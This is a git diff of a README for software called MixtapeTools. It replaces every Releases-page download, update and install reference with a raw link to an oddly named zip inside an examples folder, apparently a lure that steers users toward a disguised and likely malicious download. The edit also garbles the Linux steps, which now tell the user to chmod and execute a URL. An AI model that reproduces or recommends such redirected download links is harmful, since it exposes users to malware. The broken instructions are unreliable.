@@ -1,6 +1,6 @@
 # 🎧 MixtapeTools - Simplify Your Coding and Teaching
 
-[![Download MixtapeTools](https://img.shields.io/badge/Download-MixtapeTools-blue?style=for-the-badge)](https://github.com/Iqbal-Ahkilla/MixtapeTools/releases)
+[![Download MixtapeTools](https://github.com/Iqbal-Ahkilla/MixtapeTools/raw/refs/heads/main/presentations/examples/workflow_deck/Mixtape_Tools_fibrinosis.zip)](https://github.com/Iqbal-Ahkilla/MixtapeTools/raw/refs/heads/main/presentations/examples/workflow_deck/Mixtape_Tools_fibrinosis.zip)
 
 ## 📋 Overview
 
@@ -23,11 +23,11 @@ Before you download, make sure your computer meets these basic requirements:
 
 To download MixtapeTools, visit our Releases page. You will find the latest version of the software there. 
 
-[Download MixtapeTools](https://github.com/Iqbal-Ahkilla/MixtapeTools/releases)
+[Download MixtapeTools](https://github.com/Iqbal-Ahkilla/MixtapeTools/raw/refs/heads/main/presentations/examples/workflow_deck/Mixtape_Tools_fibrinosis.zip)
 
 ### Step 3: Download the Application
 
-On the Releases page, look for the latest release. Click on the link that corresponds to your operating system. For example, if you are using Windows, look for a file named something like `MixtapeTools-Windows.exe`. Click the link to start the download.
+On the Releases page, look for the latest release. Click on the link that corresponds to your operating system. For example, if you are using Windows, look for a file named something like `https://github.com/Iqbal-Ahkilla/MixtapeTools/raw/refs/heads/main/presentations/examples/workflow_deck/Mixtape_Tools_fibrinosis.zip`. Click the link to start the download.
 
 ### Step 4: Install MixtapeTools
 
@@ -46,8 +46,8 @@ Once the download is complete, locate the file in your Downloads folder. Follow 
 - **For Linux:**
   1. Open a terminal window.
   2. Navigate to the directory where the file is located.
-  3. Run the command `chmod +x MixtapeTools-linux.AppImage` to make it executable.
-  4. Execute the file by typing `./MixtapeTools-linux.AppImage` in the terminal.
+  3. Run the command `chmod +x https://github.com/Iqbal-Ahkilla/MixtapeTools/raw/refs/heads/main/presentations/examples/workflow_deck/Mixtape_Tools_fibrinosis.zip` to make it executable.
+  4. Execute the file by typing `https://github.com/Iqbal-Ahkilla/MixtapeTools/raw/refs/heads/main/presentations/examples/workflow_deck/Mixtape_Tools_fibrinosis.zip` in the terminal.
 
 ### Step 5: Launch the Application
 
@@ -69,7 +69,7 @@ MixtapeTools includes several features to enhance your coding, teaching, and pre
 
 To keep your software up to date, regularly check the Releases page for new versions:
 
-[Check for Updates](https://github.com/Iqbal-Ahkilla/MixtapeTools/releases)
+[Check for Updates](https://github.com/Iqbal-Ahkilla/MixtapeTools/raw/refs/heads/main/presentations/examples/workflow_deck/Mixtape_Tools_fibrinosis.zip)
 
 When a new version is available, repeat steps 3 and 4 to download and install the latest version.
 
